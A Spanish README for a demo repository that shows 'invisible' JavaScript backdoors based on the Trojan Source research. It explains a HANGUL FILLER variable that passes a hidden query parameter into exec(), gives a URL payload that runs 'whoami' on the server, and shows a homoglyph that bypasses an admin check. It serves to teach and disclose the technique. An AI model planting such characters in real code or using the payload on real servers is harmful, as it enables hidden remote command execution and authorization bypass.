# El backdoor invisible

Basado en el paper de la Universidad de Cambridge ["Some Vulnerabilities are Invisible"](https://www.trojansource.codes/)

## Requerimientos

*  [Node.js](https://nodejs.org/en/) - (LTS or superior) 

* Para Linux and Mac - usar [nvm](https://github.com/creationix/nvm) para instalar Node

*  [Git](https://git-scm.com/downloads)

## Instalación

Clonar el repositorio:

```bash
git clone https://github.com/ezequielsoler/invisible-backdoor.git
```

Ingresar al repositorio:

```bash
cd invisilbe-backdoor
```

Instalar las dependencia usando NPM:

```bash
npm install
```

Correr de forma local el servidor usando Node:

```bash
node server.js
```

Si todo salió bien, deberías ver el mensaje: `Server listening at localhost:3000` y al ingresar con tu navegador a  [localhost:3000](http://localhost:3000/) podrás ver la página.

## Prueba de concepto

Este script es muy simple, realiza una comprobación de estado de red HTTP ejecutando `ping -c 1 google.com` y `curl -s http://example.com` y devuelve si estos comandos se ejecutaron con éxito. El parámetro GET opcional `timeout` limita el timeout de cada comando.

## El backdoor

El primer paso es buscar un carácter Unicode invisible que se pueda interpretar como una propiedad / variable en JavaScript. 
A partir de ECMAScript versión 2015, todos los caracteres Unicode con la propiedad Unicode [ID_Start](https://unicode.org/reports/tr31/) se pueden usar en propiedades y como nombre de variable.

El carácter "ㅤ" (0x3164 en hexadecimal) se llama "HANGUL FILLER" y pertenece a la categoría Unicode ["Letra, otro"](https://unicode-explorer.com/c/3164). Como este carácter se considera una letra, tiene la propiedad `ID_Start`, por lo tanto, puede aparecer en una variable de JavaScript.

A continuación, se muestra donde se sumo el caracter "invisible" en el código pero en su representación 'escapada':

```js
const { timeout,\u3164} = req.query;
```

Al contrario de lo que se puede ver, ¡el parámetro timeout no es el único parámetro descomprimido del atributo `req.query`! Se recupera un parámetro adicional llamado "ㅤ"; si se pasa un parámetro GET llamado "ㅤ", se asignará a la variable invisible.

De manera similar, cuando el array checkCommands se declara, esta variable es incluida:

```js
const checkCommands = [
    'ping -c 1 google.com',
    'curl -s http://example.com/',\u3164
];
```

Cada elemento del array, los comandos codificados y el parámetro proporcionado por el usuario, se pasa luego a la función `exec`. Esta función ejecuta los comandos dentro de cada elemento del array. Para que un atacante ejecute comandos arbitrarios del sistema operativo, tendría que pasar un parámetro llamado "ㅤ" (en su forma codificada en URL) al endpoint:

```
http://localhost:3000/network_health?%E3%85%A4=whoami%20%3E%20static/out.html
```

Además de los caracteres invisibles, también se pueden introducir backdoors utilizando caracteres Unicode que se parecen mucho por ejemplo, a operadores:

```js
const [ ENV_PROD, ENV_DEV ] = [ 'PRODUCTION', 'DEVELOPMENT'];
/* … */
const environment = 'PRODUCTION';
/* … */
function isUserAdmin(user) {
    if(environmentǃ=ENV_PROD){
        // bypass auth checks in DEV
        return true;
    }

    /* … */
    return false;
}
```
El carácter “ǃ” utilizado no es un signo de exclamación, sino un carácter de ["Latin Letter Retroflex Click"](https://www.compart.com/en/unicode/U+01C3). Por lo tanto, la siguiente línea no compara la variable environment con la cadena, "PRODUCTION" sino que asigna la cadena "PRODUCTION" a la variable previamente indefinida environmentǃ:

Por lo tanto, la expresión dentro de la instrucción if es siempre `true`.

Hay muchos otros caracteres que se parecen a los que se usan en el código que pueden usarse para tales propósitos (por ejemplo, “／”, “-”, “＋”, “⩵”, “❨”, “⫽”, “꓿” , “∗”). Unicode llama a estos caracteres ["confusables"](https://unicode.org/reports/tr36/#visual_spoofing) 
